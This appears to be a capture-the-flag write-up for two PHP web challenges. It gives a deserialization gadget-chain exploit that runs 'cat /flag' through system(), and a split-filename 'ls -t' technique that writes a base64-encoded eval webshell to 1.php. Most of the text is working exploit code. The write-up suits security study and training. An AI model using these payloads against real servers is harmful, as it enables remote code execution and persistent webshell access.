## Web
### web1
index.php
```php
<?php
show_source(__FILE__);
error_reporting(0);
class Hacker{
    private $exp;
    private $cmd;

    public  function __toString()
    {
        call_user_func('system', "cat /flag");
    }
}

class A
{
    public $hacker;
    public  function __toString()
    {
        echo $this->hacker->name;
        return "";
    }
}
class C
{
    public $finish;
    public function __get($value)
    {
        $this->finish->hacker();
        echo 'nonono';
    }
}
class E
{
    public $hacker;

    public  function __invoke($parms1)
    {   
        echo $parms1;
        $this->hacker->welcome();
    }
}

class H
{
    public $username="admin";
    public function __destruct()
    {
        $this->welcome();

    }
    public  function welcome()
    {
        echo "welcome~ ".$this->username;
    }
}

class K
{
    public $func;
    public function __call($method,$args)
    {
        call_user_func($this->func,'welcome');
    }
}

class R
{
    private $method;
    private $args;

    public  function welcome()
    {
        if ($this->key === true && $this->finish1->name) {
            if ($this->finish->finish) {
                call_user_func_array($this->method,$this->args);
            }
        }
    }
}

function nonono($a){
    $filter = "/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|system|eval|flag/i";
    return preg_replace($filter,'',$a);
}

$a = $_POST["pop"];
if (isset($a)){
    unserialize(nonono($a));
}
?>
```

exp
```php
$h = new h();
$h->username = new Hacker();
echo(urlencode(serialize($h)));
```

![](attachments/Pasted%20image%2020231104100602.png)

### web2


`glob://backdoor_*.php`挨个爆
![](attachments/Pasted%20image%2020231104123757.png)

backdoor.php

```php
<?php  
highlight_file(__FILE__);  
error_reporting(0);  
  
if(isset($_GET['username'])){    $sandbox = '/var/www/html/sandbox/'.md5("5050f6511ffb64e1914be4ca8b9d585c".$_GET['username']).'/';    mkdir($sandbox);    chdir($sandbox);  
      
    if(isset($_GET['title'])&&isset($_GET['data'])){        $data = $_GET['data'];        $title= $_GET['title'];  
        if (strlen($data)>5||strlen($title)>3){  
            die("no!no!no!");  
        }        file_put_contents($sandbox.$title,$data);  
  
        if (strlen(file_get_contents($title)) <= 10) {            system('php '.$sandbox.$title);  
        }  
        else{            system('rm '.$sandbox.$title);  
            die("no!no!no!");  
        }  
  
    }  
    else if (isset($_GET['reset'])) {        system('/bin/rm -rf ' . $sandbox);  
    }  
}  
?>
```

ls -t拆分写shell
```sh
>1.php\\
>d\>\\
>e64\ -\\
>7\|bas\\
>FsxXSk\\
>kX0dFV\\
>XZhbCg\\
>waHAgZ\\
>o\ PD9\\
>ech\\
ls -t>1
sh 1
```